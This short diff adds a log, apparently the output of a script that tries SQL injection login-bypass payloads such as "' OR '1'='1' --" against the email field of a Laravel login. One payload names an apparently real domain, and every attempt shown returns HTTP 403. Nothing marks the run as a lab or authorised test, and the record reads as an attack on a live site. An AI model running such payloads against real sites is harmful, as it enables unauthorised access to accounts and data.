@@ -1,0 +1,12 @@
+[*] Trying payloads that pass Laravel email validation...
+  403: admin@example.com' OR '1'='1' -- 
+  403: admin@nadiavpn.web.id' OR '1'='1' -- 
+  403: test@test.com' OR '1'='1'--
+  403: x' OR '1'='1'--
+  403: ' OR 1=1 #
+  403: admin' #
+
+[*] Trying login with admin email...
+
+[*] SQLi with admin email...
+Error: HTTP Error 403: Forbidden
